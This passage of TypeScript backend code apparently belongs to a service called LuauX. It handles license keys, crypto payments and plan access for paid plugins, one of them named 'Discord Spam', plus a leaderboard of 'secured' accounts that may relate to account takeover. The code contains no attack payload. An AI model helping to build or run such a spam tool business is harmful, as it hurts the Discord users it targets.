      .update({ discord_id: user.id, delivered: true })
      .eq("id", keyRow.id)
      .in("discord_id", [UNASSIGNED_OWNER, "PENDING", "0", ""])
      .select("id, key, plugin_id, expires_at, discord_id")
      .maybeSingle();

    if (claimErr) throw new Error(claimErr.message || "Failed to redeem key");
    if (!claimed || claimed.discord_id !== user.id) {
      throw new Error("Key was claimed by someone else. Contact support.");
    }

    return {
      ok: true,
      already: false,
      plugin_id: claimed.plugin_id,
      key: claimed.key,
      expires_at: claimed.expires_at,
    };
  });

/** Admin: issue a plugin license key (verification / discord-spam / discord-autoreply) */
export const createAdminLicenseKey = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        discord_id: z.string().optional(),
        plugin_id: z.enum(["verification", "discord-spam", "discord-autoreply"]),
        duration_days: z.number().int().min(1).max(36500).default(30),
        dm_user: z.boolean().optional(),
        unassigned: z.boolean().optional(),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
    await requireUser();
    if (!(await isAdminSession())) throw new Error("Admin only");
    const db = admin();

    const PLUGIN_META: Record<string, { prefix: string; label: string }> = {
      verification: { prefix: "LX-VB", label: "Verification Bot" },
      "discord-spam": { prefix: "LX-DS", label: "Discord Spam" },
      "discord-autoreply": { prefix: "LX-AR", label: "Discord Auto-Reply" },
    };
    const meta = PLUGIN_META[data.plugin_id];
    const rand = (n: number) => {
      const bytes = new Uint8Array(n);
      crypto.getRandomValues(bytes);
      return Array.from(bytes, (b) => b.toString(16).padStart(2, "0"))
        .join("")
        .toUpperCase();
    };
    const key = `${meta.prefix}-${rand(4)}-${rand(4)}-${rand(4)}`;
    const expires_at = new Date(
      Date.now() + data.duration_days * 24 * 60 * 60 * 1000,
    ).toISOString();

    const makeUnassigned = data.unassigned === true || !data.discord_id?.trim();
    const ownerId = makeUnassigned ? UNASSIGNED_OWNER : data.discord_id!.trim();

    const { data: row, error } = await db
      .from("verification_keys")
      .insert({
        discord_id: ownerId,
        key,
        expires_at,
        plugin_id: data.plugin_id,
        delivered: false,
      })
      .select("id, key, expires_at")
      .single();

    if (error || !row) throw new Error(error?.message || "Failed to create key");

    if (!makeUnassigned && data.dm_user !== false) {
      try {
        const { envStr } = await import("./luaux-server.server");
        const botToken = envStr("DISCORD_BOT_TOKEN");
        if (!botToken) throw new Error("no bot token");
        const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
          method: "POST",
          headers: {
            Authorization: `Bot ${botToken}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ recipient_id: ownerId }),
        });
        if (dmRes.ok) {
          const dm = (await dmRes.json()) as { id: string };
          const isLifetime = data.duration_days >= 3650;
          await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
            method: "POST",
            headers: {
              Authorization: `Bot ${botToken}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              content:
                `🔑 **LuauX ${meta.label} — License Key (admin issued)**\n\n` +
                `\`\`\`${key}\`\`\`\n` +
                (isLifetime
                  ? `This key never expires.\n`
                  : `Expires: <t:${Math.floor(new Date(expires_at).getTime() / 1000)}:F>\n`) +
                `Redeem in Dashboard → Settings → Bot hours & keys if needed.\n` +
                `Keep this key private.`,
            }),
          });
          await db.from("verification_keys").update({ delivered: true }).eq("id", row.id);
        }
      } catch {
        /* DM optional */
      }
    }

    return {
      ok: true,
      key: row.key,
      expires_at: row.expires_at,
      id: row.id,
      unassigned: makeUnassigned,
    };
  });

/** Admin: list waiting manual payments (fixed LTC/SOL wallets) */
export const listPendingPayments = createServerFn({ method: "GET" }).handler(async () => {
  const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
  await requireUser();
  if (!(await isAdminSession())) throw new Error("Admin only");
  const { data, error } = await admin()
    .from("payments")
    .select(
      "id, discord_id, plan_id, pay_currency, pay_amount, pay_address, price_amount, status, created_at",
    )
    .eq("status", "waiting")
    .order("created_at", { ascending: false })
    .limit(50);
  if (error) throw new Error(error.message);
  return data ?? [];
});

/** Admin: mark a payment as paid (fallback if chain watch misses) */
export const confirmManualPayment = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        payment_id: z.string().uuid(),
        txid: z.string().min(8).max(128).optional(),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
    await requireUser();
    if (!(await isAdminSession())) throw new Error("Admin only");
    const { fulfillPayment } = await import("./payment-fulfill.server");
    return fulfillPayment(admin(), data.payment_id, {
      txid: data.txid,
      confirmations: 1,
      raw: { source: "admin_manual" },
    });
  });

/** Admin: grant plan hours / activate a plan for a user (payment issues) */
export const grantAdminPlanAccess = createServerFn({ method: "POST" })
  .inputValidator((input) =>
    z
      .object({
        discord_id: z.string().min(5),
        plan_id: z.string().min(1),
        extra_hours: z.number().int().min(0).max(100000).optional(),
      })
      .parse(input),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
    await requireUser();
    if (!(await isAdminSession())) throw new Error("Admin only");
    const db = admin();

    const { data: plan } = await db.from("plans").select("*").eq("id", data.plan_id).maybeSingle();
    if (!plan) throw new Error("Plan not found");
    if (plan.kind === "plugin") {
      throw new Error("Use createAdminLicenseKey for plugin licenses");
    }

    const { grantMcPlanAccess } = await import("./plan-grant.server");
    const granted = await grantMcPlanAccess(
      db,
      data.discord_id.trim(),
      plan,
      Number(data.extra_hours ?? 0),
    );
    return {
      ok: true,
      bot_hours_remaining: granted.bot_hours_remaining,
      plan_id: granted.active_plan_id || plan.id,
    };
  });

export const resetMyAccess = createServerFn({ method: "POST" }).handler(async () => {
  const { requireUser, admin, isAdminSession } = await import("./luaux-server.server");
  const user = await requireUser();
  const isAdm = await isAdminSession();
  if (!isAdm) throw new Error("Admin only");
  const db = admin();

  await db
    .from("profiles")
    .update({
      active_plan_id: null,
      plan_expires_at: null,
      bot_hours_remaining: 0,
    })
    .eq("discord_id", user.id);

  await db
    .from("verification_keys")
    .update({ expires_at: new Date().toISOString() })
    .eq("discord_id", user.id)
    .gt("expires_at", new Date().toISOString());

  return { ok: true };
});

/** Global secured-account leaderboard */
export const getLeaderboardBoard = createServerFn({ method: "GET" })
  .inputValidator((input) =>
    z
      .object({
        period: z.enum(["24h", "7d", "month", "lifetime"]).default("7d"),
        page: z.number().int().min(1).max(200).optional(),
        pageSize: z.number().int().min(5).max(50).optional(),
        search: z.string().max(80).optional(),
      })
      .parse(input ?? {}),
  )
  .handler(async ({ data }) => {
    const { requireUser, admin } = await import("./luaux-server.server");
    const user = await requireUser();
    const { rateLimit } = await import("./rate-limit.server");
    const rl = rateLimit(`leaderboard:${user.id}`, 60, 60_000);
    if (!rl.ok) throw new Error(`Too many leaderboard requests — retry in ${rl.retryAfterSec}s`);
    const { getLeaderboard } = await import("./leaderboard.server");
    try {
      return await getLeaderboard(admin(), {
        period: data.period,
        page: data.page,
        pageSize: data.pageSize,
        search: data.search,
        viewerDiscordId: user.id,
      });
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      if (/leaderboard_events|does not exist|relation/i.test(msg)) {
        throw new Error(
          "Leaderboard is not set up yet — apply migration 20260714160000_mc_refresh_and_leaderboard.sql",
        );
      }
      throw e;
    }
  });
